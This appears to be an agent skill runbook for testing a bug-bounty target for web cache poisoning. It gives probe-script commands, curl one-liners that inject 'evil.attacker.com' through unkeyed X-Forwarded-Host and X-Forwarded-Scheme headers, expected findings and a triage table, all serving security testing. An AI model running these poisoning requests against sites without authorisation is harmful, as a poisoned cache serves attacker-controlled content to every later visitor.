# Web Cache Poisoning Runbook

## Purpose
Detect web cache poisoning by injecting values through unkeyed headers (X-Forwarded-Host, X-Forwarded-Scheme, etc.), fat GET body headers, and parameter cloaking. When successful, all subsequent cache hits serve the attacker-injected content.

## Prerequisites
- Target uses a caching layer (CDN, Varnish, nginx, Squid)
- Python 3.9+ with `requests` library

## Variables
| Variable | Description |
|----------|-------------|
| `TARGET` | Target base URL |
| `OUTDIR` | Output directory |

## Commands

### 1. Full Cache Poisoning Probe, All Headers
```bash
python3 .claude/skills/http-protocol/scripts/cache_poison_probe.py \
  --context .bb/context.json \
  --target https://TARGET \
  --headers-file .claude/skills/http-protocol/payloads/cache-poison-headers.txt \
  --output $OUTDIR/http-protocol/cache/poison_findings.jsonl
```

### 2. Unkeyed Headers Only
```bash
python3 .claude/skills/http-protocol/scripts/cache_poison_probe.py \
  --context .bb/context.json \
  --target https://TARGET \
  --mode unkeyed-headers \
  --output $OUTDIR/http-protocol/cache/poison_findings.jsonl
```

### 3. Fat GET Poisoning Only
```bash
python3 .claude/skills/http-protocol/scripts/cache_poison_probe.py \
  --context .bb/context.json \
  --target https://TARGET \
  --mode fat-get \
  --output $OUTDIR/http-protocol/cache/poison_findings.jsonl
```

### 4. Parameter Cloaking Only
```bash
python3 .claude/skills/http-protocol/scripts/cache_poison_probe.py \
  --context .bb/context.json \
  --target https://TARGET \
  --mode parameter-cloaking \
  --output $OUTDIR/http-protocol/cache/poison_findings.jsonl
```

### 5. Quick Manual X-Forwarded-Host Test
```bash
# Poison the cache
curl -s -H "X-Forwarded-Host: evil.attacker.com" "https://TARGET/" -o /dev/null -D $OUTDIR/http-protocol/cache/poison_req.txt
sleep 2
# Check if poison persists
curl -s "https://TARGET/" | grep -c "evil.attacker.com"
```

### 6. X-Forwarded-Scheme Redirect Poison
```bash
curl -s -H "X-Forwarded-Scheme: http" "https://TARGET/" -o /dev/null -D $OUTDIR/http-protocol/cache/scheme_poison.txt
grep -i "location:" $OUTDIR/http-protocol/cache/scheme_poison.txt | grep -c "http:"
```

## Expected Output

### Successful header poisoning:
```json
{
  "poison_type": "unkeyed_header",
  "poison_header": "X-Forwarded-Host",
  "poison_value": "evil.attacker.com",
  "cache_hit": true,
  "reflected_in_benign": true,
  "success": true,
  "response_snippet": "evil.attacker.com found in <a href..."
}
```

### Successful fat GET poisoning:
```json
{
  "poison_type": "fat_get",
  "poison_header": "X-Forwarded-Host",
  "poison_value": "evil.attacker.com",
  "cache_hit": true,
  "success": true
}
```

## Triage Guide

| Result | Action |
|--------|--------|
| `success: true` + header-value in benign request response | Confirmed persistent poisoning |
| `reflected: true` but second response clean | Poisoning transient (no cache persistence) — Medium |
| All 25+ headers return clean | No unkeyed headers cached — safe |
| Fat GET fails but unkeyed works | Cache ignores body — expected behavior for most caches |
| Parameter cloaking finds duplicate handling | Medium — may not be cached, check manually |

## Severity: Critical if XSS via poisoning (CVSS 8.5+)
Cache poisoning serves attacker-controlled content to all subsequent viewers. Combined with stored XSS via poisoned resource, this is a critical chain.